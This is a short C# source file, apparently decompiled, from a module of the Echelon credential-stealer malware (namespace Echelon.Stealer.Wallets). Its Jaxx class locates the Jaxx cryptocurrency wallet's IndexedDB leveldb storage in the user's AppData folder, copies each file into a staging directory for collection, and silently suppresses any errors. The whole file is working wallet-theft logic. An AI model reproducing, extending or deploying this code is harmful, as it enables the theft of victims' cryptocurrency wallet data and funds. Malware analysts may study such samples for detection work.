using System;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x02000010 RID: 16
	internal class Jaxx
	{
		// Token: 0x06000042 RID: 66 RVA: 0x00019C28 File Offset: 0x00017E28
		public static void JaxxStr(string directorypath)
		{
			try
			{
				if (Directory.Exists(Jaxx.JaxxDir2))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(Jaxx.JaxxDir2).GetFiles())
					{
						Directory.CreateDirectory(directorypath + Jaxx.JaxxDir);
						fileInfo.CopyTo(directorypath + Jaxx.JaxxDir + fileInfo.Name);
					}
					Jaxx.count++;
					Wallets.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000044 RID: 68
		public static int count;

		// Token: 0x04000045 RID: 69
		public static string JaxxDir = "\\Wallets\\Jaxx\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\";

		// Token: 0x04000046 RID: 70
		public static string JaxxDir2 = Help.AppDate + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\";
	}
}
